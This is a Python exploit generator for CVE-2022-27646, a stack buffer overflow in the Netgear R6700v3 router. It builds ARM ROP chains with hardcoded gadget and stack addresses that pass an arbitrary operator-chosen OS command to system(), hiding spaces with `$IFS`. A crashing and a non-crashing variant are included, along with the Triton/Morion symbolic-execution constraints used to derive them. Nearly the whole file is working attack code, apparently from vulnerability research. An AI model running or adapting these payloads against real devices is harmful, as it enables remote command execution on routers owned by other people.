#!/usr/bin/env python3
## -*- coding: utf-8 -*-
import argparse

md5_sum_len = 32

def create_payload(cmd: str = None, crash: bool = True) -> bytes:
    # Payload executing OS command
    if cmd:
        # Replace spaces in the command (spaces cannot be used due to sscanf(str, "%s %s"))
        cmd = cmd.replace(' ', '`$IFS`')

        # Payload for simple ROP chain (crashing the target)
        if crash:
            # Payload Generation with Morion
            """
            from triton import *

            cmd = 0xbeffc215

            g0_cmd_ast = ctx.getMemoryAst(MemoryAccess(cmd, 8))
            g0_cmd_val = int.from_bytes(bytes("id;#", "UTF-8"), byteorder="little")
            g0_r6_ast  = ctx.getRegisterAst(ctx.registers.r6)
            g0_r6_val  = cmd
            g0_pc_ast  = ctx.getRegisterAst(ctx.registers.pc)
            g0_pc_val  = 0xc9b8

            model = ctx.getModel(ast.land([
                g0_cmd_ast == g0_cmd_val,
                g0_r6_ast  == g0_r6_val,
                g0_pc_ast  == g0_pc_val,
            ]))
            pprint(model)
            """
            max_cmd_len = 624-2
            payload  = b"A"*(md5_sum_len+2)                 # 2nd fgets will overwrite this with an MD5 sum (plus "\n" and "\x00")
            payload += b"B"*222
            payload += b" "                                 # String separator: sscanf(str, "%s %s", ...)
            payload += bytes(cmd, 'UTF-8')[:max_cmd_len]    # System command to execute
            payload += b";#"                                # Terminate command and ignore what follows
            payload += b"C"*(max_cmd_len-len(cmd))          # Fill up depending on the command length
            payload += b"\x15\xc2\xff\xbe"                  # r6 (address of OS command, no ASRL: 0xbeffc114+34+222+1 = 0xbeffc215)
            payload += b"D"*20
            payload += b"\xb8\xc9\x00\x00"                  # pc (address of ROP gadget 1: mov r0, r6; bl #0x94a0 <system@plt>)
            payload += b"E"*114
        # Payload for advanced ROP chain (non-crashing the target)
        else:
            # Payload generation with Morion
            """
            from triton import *

            g1_buf      = 0xbeffc114+34+362+1
            g5_buf      = g1_buf+10*4
            g2_buf      = 0xbeffc114+1023-8*4-2*4-2*4
            cmd         = 0xbeffc114+34
            system_libc = 0x94a0

            # Preconditions gadget 0
            g0_sp_val   = ctx.getConcreteRegisterValue(ctx.registers.sp)-9*4
            g0_r11_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+7*4, 4))
            g0_r11_val  = g1_buf+10*4
            g0_pc_ast   = ctx.getMemoryAst(MemoryAccess(g0_sp_val+8*4, 4))
            g0_pc_val   = 0x9428

            # Preconditions gadget 1
            g1_r5_ast   = ctx.getMemoryAst(MemoryAccess(g0_r11_val-10*4+1*4, 4))
            g1_r5_val   = cmd
            g1_r11_ast  = ctx.getMemoryAst(MemoryAccess(g0_r11_val-10*4+7*4, 4))
            g1_r11_val  = g5_buf+10*4
            g1_sp_ast   = ctx.getMemoryAst(MemoryAccess(g0_r11_val-10*4+8*4, 4))
            g1_sp_val   = g2_buf
            g1_pc_ast   = ctx.getMemoryAst(MemoryAccess(g0_r11_val-10*4+9*4, 4))
            g1_pc_val   = 0x9eb8

            # Preconditions gadget 2
            g2_sp_val   = g1_sp_val
            g2_pc_ast   = ctx.getMemoryAst(MemoryAccess(g2_sp_val+7*4, 4))
            g2_pc_val   = 0x997c

            # Preconditions gadget 3
            g3_sp_val   = g2_sp_val+8*4
            g3_r3_ast   = ctx.getMemoryAst(MemoryAccess(g3_sp_val+0*4, 4))
            g3_r3_val   = system_libc
            g3_pc_ast   = ctx.getMemoryAst(MemoryAccess(g3_sp_val+1*4, 4))
            g3_pc_val   = 0x9984

            # Preconditions gadget 4
            g4_sp_val   = g3_sp_val+2*4
            g4_pc_ast   = ctx.getMemoryAst(MemoryAccess(g4_sp_val+1*4, 4))
            g4_pc_val   = 0x9428

            # Preconditions gadget 5
            g5_r4_ast   = ctx.getMemoryAst(MemoryAccess(g1_r11_val-10*4+0*4, 4))
            g5_r4_val   = 0x1b850
            g5_r5_ast   = ctx.getMemoryAst(MemoryAccess(g1_r11_val-10*4+1*4, 4))
            g5_r5_val   = 0xbeffe9c0
            g5_r6_ast   = ctx.getMemoryAst(MemoryAccess(g1_r11_val-10*4+2*4, 4))
            g5_r6_val   = 0x64ae6532
            g5_r7_ast   = ctx.getMemoryAst(MemoryAccess(g1_r11_val-10*4+3*4, 4))
            g5_r7_val   = 0xbeffedc0
            g5_r8_ast   = ctx.getMemoryAst(MemoryAccess(g1_r11_val-10*4+4*4, 4))
            g5_r8_val   = 0x64ae6532
            g5_r9_ast   = ctx.getMemoryAst(MemoryAccess(g1_r11_val-10*4+5*4, 4))
            g5_r9_val   = 0xbeffe5c0
            g5_r10_ast  = ctx.getMemoryAst(MemoryAccess(g1_r11_val-10*4+6*4, 4))
            g5_r10_val  = 0x21ae0
            g5_r11_ast  = ctx.getMemoryAst(MemoryAccess(g1_r11_val-10*4+7*4, 4))
            g5_r11_val  = 0xbeffddc0
            g5_sp_ast   = ctx.getMemoryAst(MemoryAccess(g1_r11_val-10*4+8*4, 4))
            g5_sp_val   = 0xbeffc8a0
            g5_pc_ast   = ctx.getMemoryAst(MemoryAccess(g1_r11_val-10*4+9*4, 4))
            g5_pc_val   = 0xf1a4

            model = ctx.getModel(ast.land([
                g0_r11_ast == g0_r11_val,
                g0_pc_ast  == g0_pc_val,
                g1_r5_ast  == g1_r5_val,
                g1_r11_ast == g1_r11_val,
                g1_sp_ast  == g1_sp_val,
                g1_pc_ast  == g1_pc_val,
                g2_pc_ast  == g2_pc_val,
                g3_r3_ast  == g3_r3_val,
                g3_pc_ast  == g3_pc_val,
                g4_pc_ast  == g4_pc_val,
                g5_r4_ast  == g5_r4_val,
                g5_r5_ast  == g5_r5_val,
                g5_r6_ast  == g5_r6_val,
                g5_r7_ast  == g5_r7_val,
                g5_r8_ast  == g5_r8_val,
                g5_r9_ast  == g5_r9_val,
                g5_r10_ast == g5_r10_val,
                g5_r11_ast == g5_r11_val,
                g5_sp_ast  == g5_sp_val,
                g5_pc_ast  == g5_pc_val
            ]))
            pprint(model)
            """
            max_cmd_len = 354-2
            payload  = b"A"*(md5_sum_len+2)                 # 2nd fgets will overwrite this with an MD5 sum (plus "\n" and "\x00")
            payload += bytes(cmd, 'UTF-8')[:max_cmd_len]    # System command to execute
            payload += b";#"                                # Terminate command and ignore what follows
            payload += b"B"*(max_cmd_len-len(cmd))          # Fill up depending on the command length
            payload += b"\xc9\xc2\xff\xbe"
            payload += b"\x28\x94\x00\x00"
            payload += b" "                                 # String separator: sscanf(str, "%s %s", ...)
            payload += b"C"*4
            payload += b"\x36\xc1\xff\xbe"
            payload += b"D"*20
            payload += b"\xf1\xc2\xff\xbe"
            payload += b"\xe3\xc4\xff\xbe"
            payload += b"\xb8\x9e\x00\x00"
            payload += b"\x50\xb8\x01\x00"
            payload += b"\xc0\xe9\xff\xbe"
            payload += b"\x32\x65\xae\x64"
            payload += b"\xc0\xed\xff\xbe"
            payload += b"\x32\x65\xae\x64"
            payload += b"\xc0\xe5\xff\xbe"
            payload += b"\xe0\x1a\x02\x00"
            payload += b"\xc0\xdd\xff\xbe"
            payload += b"\xa0\xc8\xff\xbe"
            payload += b"\xa4\xf1\x00\x00"
            payload += b"F"*526
            payload += b"\x7c\x99\x00\x00"
            payload += b"\xa0\x94\x00\x00"
            payload += b"\x84\x99\x00\x00"
            payload += b"G"*4
            payload += b"\x28\x94\x00\x00"
    # Payload triggering vulnerability (PoV)
    else:
        # PoV for simple ROP chain (crashing the target)
        if crash:
            payload  = b"A"*(md5_sum_len+2)
            payload += b"B"*222
            payload += b" "
            payload += b"C"*766
        # PoV for advanced ROP chain (non-crahsing the target)
        else:
            payload  = b"A"*(md5_sum_len+2)
            payload += b"B"*362
            payload += b" "
            payload += b"C"*626
            # payload = bytearray(
            #     b"A"*(md5_sum_len) + 
            #     b"B"*363 + b" " +
            #     b"C"*626
            # )

            # payload = bytearray([
            #     0x41, 0x42, 0x43
            # ])
    return payload


def main() -> None:
    # Argument parsing
    description = """
    Create payloads to exploit CVE-2022-27646 (stack buffer overflow on Netgear
    R6700v3).
    """
    parser = argparse.ArgumentParser(description=description,
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("--cmd", default=None,
                        help="OS command to execute or empty for a sample proof of vulnerability")
    parser.add_argument("--crash", action="store_true",
                        help="simple ROP chain crashing the target binary")
    parser.add_argument("--out", default="circleinfo.txt",
                        help="output file containing the payload")
    args = parser.parse_args()

    # Payload generation
    payload = create_payload(args.cmd, args.crash)
    with open(args.out, "wb") as f:
        f.write(payload)
    
    return

if __name__ == "__main__":
    main()